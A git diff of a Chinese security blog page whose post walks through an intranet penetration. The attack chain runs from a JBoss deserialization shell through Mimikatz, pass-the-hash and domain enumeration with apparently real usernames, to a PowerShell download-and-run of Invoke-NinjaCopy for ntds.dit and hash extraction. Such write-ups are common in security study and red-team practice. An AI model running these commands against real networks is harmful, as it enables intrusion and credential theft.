@@ -1,284 +1,221 @@
-
-
 <!DOCTYPE html>
-<html lang="">
-<head prefix="og: http://ogp.me/ns#"><meta name="generator" content="Hexo 3.8.0">
-    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="description" content="">
-    <title>JBoss引起的内网渗透 | c1y2m3’blog</title>
+    <meta name="keyword" content="">
+    <link rel="shortcut icon" href="/c1y2m3.github.io/img/favicon.ico">
 
-    <!-- Open Graph -->
-    <meta name="description" content="&amp;#x5207;&amp;#x5165;&amp;#x70B9;Jboss&amp;#x7684;&amp;#x53CD;&amp;#x5E8F;&amp;#x5217;&amp;#x5316;&amp;#x6F0F;&amp;#x6D1E;&amp;#xFF0C;&amp;#x83B7;&amp;#x53D6;&amp;#x5230;shell&amp;#xFF0C;&amp;#x5C31;&amp;#x4E0D;&amp;#x591A;&amp;#x8BF4;&amp;#x4E86;&amp;#xFF0C;&amp;#x8FDC;&amp;#x7A0B;&amp;#x90E">
-<meta property="og:type" content="article">
-<meta property="og:title" content="JBoss引起的内网渗透">
-<meta property="og:url" content="http://yoursite.com/2019/05/26/26/index.html">
-<meta property="og:site_name" content="c1y2m3’blog">
-<meta property="og:description" content="&amp;#x5207;&amp;#x5165;&amp;#x70B9;Jboss&amp;#x7684;&amp;#x53CD;&amp;#x5E8F;&amp;#x5217;&amp;#x5316;&amp;#x6F0F;&amp;#x6D1E;&amp;#xFF0C;&amp;#x83B7;&amp;#x53D6;&amp;#x5230;shell&amp;#xFF0C;&amp;#x5C31;&amp;#x4E0D;&amp;#x591A;&amp;#x8BF4;&amp;#x4E86;&amp;#xFF0C;&amp;#x8FDC;&amp;#x7A0B;&amp;#x90E">
-<meta property="og:locale" content="default">
-<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5cea3af1ea3b4a292e072f80">
-<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5cea3b182711cd2096ff5116">
-<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5cea3ac59b521a11ecb7384f">
-<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5cea3aa72711cd2096ff4e6f">
-<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5cf13b8ddb5aa6649fc91a2b">
-<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5cf13cfcea3b4a79232077e9">
-<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5cea3a81e67d0a23c65bb1e0">
-<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5cea3a5f2711cd2096ff4c8f">
-<meta property="og:updated_time" content="2019-05-31T14:41:56.000Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="JBoss引起的内网渗透">
-<meta name="twitter:description" content="&amp;#x5207;&amp;#x5165;&amp;#x70B9;Jboss&amp;#x7684;&amp;#x53CD;&amp;#x5E8F;&amp;#x5217;&amp;#x5316;&amp;#x6F0F;&amp;#x6D1E;&amp;#xFF0C;&amp;#x83B7;&amp;#x53D6;&amp;#x5230;shell&amp;#xFF0C;&amp;#x5C31;&amp;#x4E0D;&amp;#x591A;&amp;#x8BF4;&amp;#x4E86;&amp;#xFF0C;&amp;#x8FDC;&amp;#x7A0B;&amp;#x90E">
-<meta name="twitter:image" content="https://www.yunzhijia.com/microblog/filesvr/5cea3af1ea3b4a292e072f80">
-
-    <script type="application/ld+json">
-{
-  "@context": "http://schema.org",
-  "@type": "Person",
-  "email": "mailto:",
-  "image": "",
-  "name": "John Doe",
-  "url": "http://yoursite.com"
-}
-</script>
-    <script>
-    var algoliaEnabled = false;
-    
-</script>
-
-    
-
-    
-    
-        <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
-    
-    
-    
-        <!-- stylesheets list from config.yml -->
+    <title>
         
-        <link rel="stylesheet" href="/c1y2m3.github.io/css/aloha.css">
+        JBoss引起的内网渗透 - undefined
         
-        <link rel="stylesheet" href="//cdn.bootcss.com/semantic-ui/2.2.4/semantic.min.css">
-        
-        <link rel="stylesheet" href="//cdn.bootcss.com/magnific-popup.js/1.1.0/magnific-popup.min.css">
-        
-    
+    </title>
 
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/c1y2m3.github.io/css/aircloud.css">
+    <link rel="stylesheet" href="/c1y2m3.github.io/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
 </head>
-<body id="body" style="margin-bottom: 0;" class="pushable">
 
-    <div class="ui top fixed menu">
-        <a class="item" id="menu-icon"><i class="sidebar icon"></i></a>
-    </div>
+<body>
 
-    <div id="menu-sidebar" class="ui left vertical sidebar menu">
-
-    <div id="sidebar-top">
-        <div class="content">
-            <h3>c1y2m3’blog</h3>
-        </div>
-    </div>
-    <div class="ui container sidebar-card">
-    <div class="ui people shape content">
-        <div class="active side">
-            <div class="ui card">
-                <div class="image">
-                    <img class="ui medium bordered image" src="/c1y2m3.github.io/images/avatar.jpg">
-                </div>
-                <div class="content">
-                    <a class="header">John Doe</a>
-                    
-                </div>
-                <div class="extra content">
-                    <div class="ui list">
-                        
-                        
-                    </div>
-
-                </div>
-                <div class="extra content">
-                    <div class="ui list">
-                        
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
 </div>
 
-    
-    
-
-    
-
-    
-    <a href="/index.html" class="item">
-        <i class="home icon"></i>
-        HOME
-    </a>
-
-    
-
-    
+<div class="index-about">
+    <i>  </i>
 </div>
 
-    <div class="pusher body-content">
-        <div id="content" class="ui main container">
-            <!--<div class="ui one column grid">-->
-                <!--<div class="column">-->
-                    <!--<div class="ui main container">-->
-                        <div id="post-26" class="ui main container article-type-post">
-
+<div class="index-container">
     
-
-    <div class="ui divided grid">
-
-        <div class="two column row" id="article-content">
-
-            <div class="thirteen wide computer thirteen wide tablet sixteen wide mobile column">
-                
-
-<h1 class="ui header">
-    
-    JBoss引起的内网渗透
-</h1>
-
-
-
-                <div class="article-inner">
-
-                    <div class="article-entry" itemprop="articleBody">
-                        
-                        <h1 id="&#x5207;&#x5165;&#x70B9;"><a href="#&#x5207;&#x5165;&#x70B9;" class="headerlink" title="&#x5207;&#x5165;&#x70B9;"></a>&#x5207;&#x5165;&#x70B9;</h1><p>Jboss&#x7684;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;&#xFF0C;&#x83B7;&#x53D6;&#x5230;shell&#xFF0C;&#x5C31;&#x4E0D;&#x591A;&#x8BF4;&#x4E86;&#xFF0C;&#x8FDC;&#x7A0B;&#x90E8;&#x7F72;war&#x3002;</p>
-<h1 id="&#x4FE1;&#x606F;&#x6536;&#x96C6;"><a href="#&#x4FE1;&#x606F;&#x6536;&#x96C6;" class="headerlink" title="&#x4FE1;&#x606F;&#x6536;&#x96C6;"></a>&#x4FE1;&#x606F;&#x6536;&#x96C6;</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">whoami  --&gt; windows-7p8piq7\administrator</span><br><span class="line">ipconfig --&gt; 192.168.58.231</span><br><span class="line">tasklist --&gt; 360EntClient.exe \ZhuDongFangYu.exe .. (360&#x5168;&#x5BB6;&#x6876;)</span><br><span class="line">systeminfo --&gt; Windows Server 2008 R2 Enterprise</span><br></pre></td></tr></table></figure>
-<h1 id="&#x6A2A;&#x5411;&#x62D3;&#x5C55;"><a href="#&#x6A2A;&#x5411;&#x62D3;&#x5C55;" class="headerlink" title="&#x6A2A;&#x5411;&#x62D3;&#x5C55;"></a>&#x6A2A;&#x5411;&#x62D3;&#x5C55;</h1><h2 id="&#x524D;&#x594F;"><a href="#&#x524D;&#x594F;" class="headerlink" title="&#x524D;&#x594F;"></a>&#x524D;&#x594F;</h2><p>&#x7528;<code>CS</code>&#x751F;&#x6210;<code>powershell</code>&#x7684;<code>exp</code>&#x5C31;&#x8FC7;&#x4E86;&#x3002;&#x5230;&#x76EE;&#x6807;&#x673A;<code>cmd</code>&#x4E0B;&#x6267;&#x884C;&#x5F39;&#x56DE;&#x3002;&#x7531;&#x4E8E;&#x6743;&#x9650;&#x8F83;&#x9AD8;&#xFF0C;</p>
-<p>&#x76F4;&#x63A5;<code>run Mimikatz</code> &#x83B7;&#x53D6;&#x5230;&#x4E86;&#x5F53;&#x524D;&#x4E3B;&#x673A;&#x7528;&#x6237;&#x7684;ntlm hash&#x3002;</p>
-<p><a class="magnific-img" href="https://www.yunzhijia.com/microblog/filesvr/5cea3af1ea3b4a292e072f80"><img src="https://www.yunzhijia.com/microblog/filesvr/5cea3af1ea3b4a292e072f80" alt="" class="ui centered image"></a></p>
-<h2 id="&#x65B9;&#x6CD5;"><a href="#&#x65B9;&#x6CD5;" class="headerlink" title="&#x65B9;&#x6CD5;"></a>&#x65B9;&#x6CD5;</h2><p>&#x4F7F;&#x7528;<code>Cobalt Strike</code>&#x7684;ARP&#x626B;&#x63CF;&#xFF08;&#x56E0;&#x4E3A;net view&#x4F7F;&#x7528;&#x4E0D;&#x4E86;&#xFF09;&#xFF0C;&#x4F7F;&#x5F97;<code>Targets</code>&#x6709;&#x8BB0;&#x5F55;&#x3002;</p>
-<p>&#x7528;&#x6BD4;&#x8F83;&#x5178;&#x578B;&#x7684;<code>hash&#x4F20;&#x9012;</code>&#x78B0;&#x4E00;&#x4E0B;&#x770B;&#x770B;&#x8FD0;&#x6C14;&#x600E;&#x4E48;&#x6837;&#x3002;</p>
-<p>&#x767B;&#x9646;&#x60C5;&#x51B5;&#x5982;&#x4E0B;&#xFF1A;</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">192.168.58.1 # &#x6210;&#x529F;</span><br><span class="line">192.168.58.18 # &#x6210;&#x529F;</span><br><span class="line">....</span><br><span class="line">192.168.58.3 # &#x5931;&#x8D25;</span><br><span class="line">192.168.58.7 # &#x5931;&#x8D25;</span><br><span class="line">....</span><br><span class="line">192.168.58.68 # &#x6210;&#x529F;</span><br><span class="line">192.168.58.21 # &#x6210;&#x529F;</span><br></pre></td></tr></table></figure>
-<p><a class="magnific-img" href="https://www.yunzhijia.com/microblog/filesvr/5cea3b182711cd2096ff5116"><img src="https://www.yunzhijia.com/microblog/filesvr/5cea3b182711cd2096ff5116" alt="" class="ui centered image"></a></p>
-<p>&#x8FD9;&#x4E2A;&#x8FC7;&#x7A0B;&#x5C31;&#x662F;&#x4E0D;&#x65AD;&#x7684;&#x8FDB;&#x884C;<code>hash&#x6CE8;&#x5165;</code>&#xFF0C;&#x4E0D;&#x65AD;&#x7684;<code>dump&#x5BC6;&#x7801;</code>&#xFF0C;&#x7ED3;&#x679C;&#x5C31;&#x5982;&#x4E0A;&#x56FE;&#x3002;&#x770B;<code>Credentials</code>&#x91CC;&#x662F;&#x5426;&#x5B58;&#x5728;&#x57DF;&#x7BA1;&#x7528;&#x6237;&#x8D26;&#x5BC6;&#x3002;<br><a class="magnific-img" href="https://www.yunzhijia.com/microblog/filesvr/5cea3ac59b521a11ecb7384f"><img src="https://www.yunzhijia.com/microblog/filesvr/5cea3ac59b521a11ecb7384f" alt="" class="ui centered image"></a></p>
-<h2 id="&#x5B9A;&#x4F4D;"><a href="#&#x5B9A;&#x4F4D;" class="headerlink" title="&#x5B9A;&#x4F4D;"></a>&#x5B9A;&#x4F4D;</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#x4ECE;58.18&#x7684;&#x673A;&#x5B50;&#x4E0A;&#x53D1;&#x73B0;&#x5B58;&#x5728;&#x57DF;&#xFF1A; </span><br><span class="line"></span><br><span class="line">&#x6240;&#x5C5E;&#x57DF; --&gt;MERCURY.COM  &#x8FD1;1400&#x4E2A;&#x57DF;&#x7528;&#x6237;...</span><br><span class="line"></span><br><span class="line">nltest /dclist:MERCURY.COM #&#x67E5;&#x770B;&#x57DF;&#x63A7; &#xFF08;2&#x4E2A;)</span><br><span class="line"></span><br><span class="line">pdc.mercury.com [PDC]  --&gt; &#x4E3B;dc --&gt; 192.168.58.2</span><br><span class="line">BDC.mercury.com        --&gt; &#x5907;dc --&gt; 192.168.58.1</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">net group &quot;domain admins&quot; /domain  #&#x67E5;&#x770B;&#x57DF;&#x7BA1;&#x7406;&#x5458; &#xFF08;9&#x4E2A;)</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">Administrator            chenfeng                 chudonggen               </span><br><span class="line">dongzhiwei               IT                       lifen                    </span><br><span class="line">qiaopeng                 weiwei                   zhangxuejun </span><br><span class="line"></span><br><span class="line">net group &quot;domain controllers&quot; /domain  #&#x67E5;&#x770B;&#x57DF;&#x63A7;&#x5236;&#x5668;</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">BDC$                     PDC$</span><br></pre></td></tr></table></figure>
-<p><a class="magnific-img" href="https://www.yunzhijia.com/microblog/filesvr/5cea3aa72711cd2096ff4e6f"><img src="https://www.yunzhijia.com/microblog/filesvr/5cea3aa72711cd2096ff4e6f" alt="" class="ui centered image"></a></p>
-<p>&#x7136;&#x800C;&#x53D1;&#x73B0;&#x6211;&#x5DF2;&#x7ECF;&#x83B7;&#x53D6;&#x5230;&#x4E86;dc&#x7684;&#x8D26;&#x53F7;&#x5BC6;&#x7801;&#x3002;&#x5E76;&#x5728;<code>CS</code>&#x4E0A;&#x4E0A;&#x7EBF;&#x4E86;&#xFF0C;&#x8FD9;&#x5C31;&#x610F;&#x5473;&#x7684;&#x6B64;&#x65F6;&#x7684;&#x57DF;&#x5DF2;&#x7ECF;&#x6CA6;&#x9677;&#x3002;</p>
-<p>&#x540C;&#x65F6;&#x901A;&#x8FC7;GPP&#x7EC4;&#x7B56;&#x7565;&#x6F0F;&#x6D1E;&#x6210;&#x529F;&#x89E3;&#x5BC6;&#x51FA;administraor&#x5BC6;&#x7801;&#xFF1A;<br><a class="magnific-img" href="https://www.yunzhijia.com/microblog/filesvr/5cf13b8ddb5aa6649fc91a2b"><img src="https://www.yunzhijia.com/microblog/filesvr/5cf13b8ddb5aa6649fc91a2b" alt="" class="ui centered image"></a><br><a class="magnific-img" href="https://www.yunzhijia.com/microblog/filesvr/5cf13cfcea3b4a79232077e9"><img src="https://www.yunzhijia.com/microblog/filesvr/5cf13cfcea3b4a79232077e9" alt="" class="ui centered image"></a></p>
-<h2 id="&#x95EE;&#x9898;"><a href="#&#x95EE;&#x9898;" class="headerlink" title="&#x95EE;&#x9898;"></a>&#x95EE;&#x9898;</h2><ul class="ui list">
-<li>vssadmin &#x65E0;&#x6CD5;&#x63D0;&#x53D6;&#x51FA;ntds.dit&#x3001;&#x5728;&#x7CFB;&#x7EDF;&#x4E2D;&#x5361;&#x6B7B;</li>
-<li>ntdsutil &#x88AB;&#x7834;&#x574F;&#x3001;&#x65E0;&#x6CD5;&#x8FD0;&#x884C;</li>
-<li>&#x5B58;&#x5728;&#x6740;&#x8F6F;&#xFF0C;mimikatz &#x65E0;&#x6CD5;&#x6267;&#x884C;</li>
-</ul>
-<h2 id="&#x7A81;&#x7834;&#x65B9;&#x6CD5;&#xFF1A;"><a href="#&#x7A81;&#x7834;&#x65B9;&#x6CD5;&#xFF1A;" class="headerlink" title="&#x7A81;&#x7834;&#x65B9;&#x6CD5;&#xFF1A;"></a>&#x7A81;&#x7834;&#x65B9;&#x6CD5;&#xFF1A;</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1&apos;); Invoke-NinjaCopy -Path &quot;C:\windows\ntds\ntds.dit&quot; -LocalDestination &quot;C:\Users\dongzhiwei\Desktop\ntds.dit&quot;</span><br></pre></td></tr></table></figure>
-<p>&#x8FD9;&#x91CC;&#x7528;powerSploit&#x6846;&#x67B6;&#x4E2D;&#x7684;Invoke-NinjaCopy,&#x8FDC;&#x7A0B;&#x590D;&#x5236;&#x6587;&#x4EF6;&#xFF0C;&#x6210;&#x529F;&#x63D0;&#x53D6;&#x5230;ntds.dit / system.hive</p>
-<h2 id="&#x63D0;&#x53D6;"><a href="#&#x63D0;&#x53D6;" class="headerlink" title="&#x63D0;&#x53D6;"></a>&#x63D0;&#x53D6;</h2><p>&#x53C2;&#x8003;&#x94FE;&#x63A5;&#xFF1A;<a href="https://github.com/zcgonvh/NTDSDumpEx" target="_blank" rel="noopener">https://github.com/zcgonvh/NTDSDumpEx</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsdumpex.exe -d ntds.dit -o hash.txt -s system.hiv</span><br></pre></td></tr></table></figure>
-<p><a class="magnific-img" href="https://www.yunzhijia.com/microblog/filesvr/5cea3a81e67d0a23c65bb1e0"><img src="https://www.yunzhijia.com/microblog/filesvr/5cea3a81e67d0a23c65bb1e0" alt="" class="ui centered image"></a></p>
-<p>&#x4E4B;&#x524D;&#x7ED9;&#x81EA;&#x5DF1;&#x6316;&#x4E86;&#x4E2A;&#x5751;&#xFF0C;&#x5173;&#x4E8E;&#x4EFB;&#x4F55;&#x53BB;&#x83B7;&#x53D6;&#x57DF;&#x7528;&#x6237;&#x7684;&#x767B;&#x5F55;IP&#xFF0C;&#x9664;&#x4E86;nmap&#x5916;&#xFF0C;&#x53EF;&#x4EE5;ping&#x57DF;&#x7528;&#x6237;&#x540D;&#xFF0C;&#x7136;&#x800C;&#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x975E;&#x5E38;&#x9519;&#x8BEF;&#x7684;&#x8BA4;&#x77E5;&#xFF0C;&#x8FD9;&#x79CD;&#x524D;&#x63D0;&#x662F;&#x673A;&#x5668;&#x540D;&#x548C;&#x7528;&#x6237;&#x540D;&#x76F8;&#x540C;&#xFF0C;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x5C11;&#x4E4B;&#x53C8;&#x5C11;&#x3002;</p>
-<p>&#x53C2;&#x8003;klion&#x725B;&#x7684;&#x65B9;&#x6CD5;&#xFF1A;</p>
-<p>&#x4ECE;&#x76EE;&#x6807;&#x4E3B;&#x63A7;&#x4E2D;&#x5BFC;&#x51FA;&#x6210;&#x529F;&#x767B;&#x5F55;&#x65E5;&#x5FD7;,&#x6765;&#x5B9A;&#x4F4D;&#x6307;&#x5B9A;&#x76EE;&#x6807;&#x673A;&#x5668;</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell hostname</span><br><span class="line">beacon&gt; shell wevtutil epl Security c:\windows\logs\risalogs.evtx /q:&quot;*[EventData[Data[@Name=&apos;LogonType&apos;]=&apos;3&apos;] and System[(EventID=4624) and TimeCreated[timediff(@SystemTime) &lt;= 4449183132]]]&quot;</span><br><span class="line">beacon&gt; shell tasklist | findstr &quot;wevtutil.exe&quot;</span><br><span class="line">beacon&gt; shell dir c:\windows\logs\risalogs.evtx</span><br><span class="line">beacon&gt; download c:\windows\logs\risalogs.evtx</span><br><span class="line">beacon&gt; downloads</span><br></pre></td></tr></table></figure>
-<p>&#x5229;&#x7528; <code>Log Parser</code> &#x65E5;&#x5FD7;&#x5206;&#x6790;&#x5DE5;&#x5177;,&#x4ECE;log&#x4E2D;&#x5339;&#x914D;&#xFF1A;</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe -i:EVT -o csv &quot;SELECT TO_UPPERCASE(EXTRACT_TOKEN(Strings,5,&apos;|&apos;)) as NAME,TO_UPPERCASE(EXTRACT_TOKEN(Strings,18,&apos;|&apos;)) as IP FROM c:\risalogs.evtx&quot; &gt; C:\log.txt</span><br><span class="line"></span><br><span class="line">&#x8FDB;&#x884C;&#x53BB;&#x91CD;&#x3001;&#x66FF;&#x6362;&#xFF1A;</span><br><span class="line"></span><br><span class="line">grep -v &apos;\$&apos; log.txt | sort | uniq | egrep -v &apos;ANONYMOUS LOGON|-|:&apos; &gt; login_succeed.txt</span><br></pre></td></tr></table></figure>
-<p><a class="magnific-img" href="https://www.yunzhijia.com/microblog/filesvr/5cea3a5f2711cd2096ff4c8f"><img src="https://www.yunzhijia.com/microblog/filesvr/5cea3a5f2711cd2096ff4c8f" alt="" class="ui centered image"></a></p>
-<h1 id="&#x6536;&#x5C3E;"><a href="#&#x6536;&#x5C3E;" class="headerlink" title="&#x6536;&#x5C3E;"></a>&#x6536;&#x5C3E;</h1><p>&#x200B;    &#x4ECE;&#x5185;&#x7F51;&#x4E2D;&#x83B7;&#x53D6;&#x4E86;&#x5927;&#x91CF;&#x4E3B;&#x673A;&#x6743;&#x9650;&#xFF0C;VPN&#x3001;&#x6838;&#x5FC3;&#x4EE3;&#x7801;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x7B49;&#xFF0C;&#x9010;&#x8FDB;&#x884C;&#x653E;&#x5F03;&#x6743;&#x9650;&#xFF0C;&#x5220;&#x9664;&#x540E;&#x95E8;&#xFF0C;&#x6240;&#x6709;&#x64CD;&#x4F5C;&#x5E76;&#x672A;&#x66F4;&#x6539;&#xFF0C;&#x4E0B;&#x8F7D;&#xFF0C;&#x5220;&#x9664;&#x7B49;&#x4E00;&#x5207;&#x635F;&#x5BB3;&#x8BE5;&#x516C;&#x53F8;&#x7684;&#x884C;&#x4E3A;&#x3002;</p>
-
-                        
-                    </div>
-
-                    
-                    
-                    
-
-                    <div class="description post-description">
-    <span class="post-description-item">
-        <time datetime="2019-05-26T07:12:00.000Z" itemprop="datePublished">2019-05-26</time>
-
-    </span>
-    <span class="post-description-item">
+    <div class="index-left">
         
-    </span>
-</div>
-
-                </div>
-                
-                <div id="pagination" class="nav-web ui text container pagination">
-
-    <div class="ui stackable two column divided grid container">
-        <div class="row">
-            <div class="column nav-left">
-                
-
-                <a class="ui tiny button disabled"><i class="angle left icon"></i>Previous</a>
-
-                
-            </div>
-            <div class="column nav-right">
-                
-
-                <a href="/c1y2m3.github.io/2019/04/04/15543609538285/" class="ui tiny button">
-                    
-                    JSP Shell Bypass WAF
-                    
-                    <i class="angle right icon"></i></a>
-                
-            </div>
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar ">
+            <img src="/c1y2m3.github.io/">
+        </div>
+        <div class="name">
+            <i>John Doe</i>
         </div>
     </div>
-
-</div>
-                
-            </div>
-
+    <div class="contents" id="nav-content">
+        <ul>
+            <li>
+                <a href="/c1y2m3.github.io/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>HOME</span>
+                </a>
+            </li>
+            <li>
+                <a href="/c1y2m3.github.io/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>TAGS</span>
+                </a>
+            </li>
+            <li>
+                <a href="/c1y2m3.github.io/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>ARCHIVES</span>
+                </a>
+            </li>
+            <li>
+                <a href="/c1y2m3.github.io/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>ABOUT</span>
+                </a>
+            </li>
             
-            <div class="three wide computer three wide tablet column">
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#切入点"><span class="toc-text">切入点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#信息收集"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#横向拓展"><span class="toc-text">横向拓展</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#前奏"><span class="toc-text">前奏</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#方法"><span class="toc-text">方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#定位"><span class="toc-text">定位</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#问题"><span class="toc-text">问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#突破方法："><span class="toc-text">突破方法：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#提取"><span class="toc-text">提取</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#收尾"><span class="toc-text">收尾</span></a></li></ol>
+</div>
+    
+</div>
 
-                <div class="ui sticky article-toc" id="article-toc">
-                    <!-- toc -->
-                    <ol class="ui ordered list"><li><a href="#切入点"><span>切入点</span></a></li><li><a href="#信息收集"><span>信息收集</span></a></li><li><a href="#横向拓展"><span>横向拓展</span></a><ol><li><a href="#前奏"><span>前奏</span></a></li><li><a href="#方法"><span>方法</span></a></li><li><a href="#定位"><span>定位</span></a></li><li><a href="#问题"><span>问题</span></a></li><li><a href="#突破方法："><span>突破方法：</span></a></li><li><a href="#提取"><span>提取</span></a></li></ol></li><li><a href="#收尾"><span>收尾</span></a></li></ol>
-                </div>
 
-            </div>
-            
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input">
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
 
         </div>
     </div>
 </div>
 
-
-                    <!--</div>-->
-                <!--</div>-->
-            <!--</div>-->
+        <div class="index-about-mobile">
+            <i>  </i>
         </div>
-        <div class="ui vertical footer segment">
-    <div class="ui center aligned container">
-        <div class="ui inverted section divider"></div>
-        &copy; 2019 <a href="/">John Doe</a>,
-        Powered by <a href="https://github.com/henryhuang/hexo-theme-aloha" target="_blank">Aloha</a> and <a href="http://hexo.io/" target="_blank">Hexo</a>.
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        JBoss引起的内网渗透
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2019-05-26 15:12:00</span></span>
+        
+        
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
+
+    </div>
+    <div class="post-content ">
+        <h1 id="切入点"><a href="#切入点" class="headerlink" title="切入点"></a>切入点</h1><p>Jboss的反序列化漏洞，获取到shell，就不多说了，远程部署war。</p>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">whoami  --&gt; windows-7p8piq7\administrator</span><br><span class="line">ipconfig --&gt; 192.168.58.231</span><br><span class="line">tasklist --&gt; 360EntClient.exe \ZhuDongFangYu.exe .. (360全家桶)</span><br><span class="line">systeminfo --&gt; Windows Server 2008 R2 Enterprise</span><br></pre></td></tr></table></figure>
+<h1 id="横向拓展"><a href="#横向拓展" class="headerlink" title="横向拓展"></a>横向拓展</h1><h2 id="前奏"><a href="#前奏" class="headerlink" title="前奏"></a>前奏</h2><p>用<code>CS</code>生成<code>powershell</code>的<code>exp</code>就过了。到目标机<code>cmd</code>下执行弹回。由于权限较高，</p>
+<p>直接<code>run Mimikatz</code> 获取到了当前主机用户的ntlm hash。</p>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5cea3af1ea3b4a292e072f80" alt=""></p>
+<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>使用<code>Cobalt Strike</code>的ARP扫描（因为net view使用不了），使得<code>Targets</code>有记录。</p>
+<p>用比较典型的<code>hash传递</code>碰一下看看运气怎么样。</p>
+<p>登陆情况如下：</p>
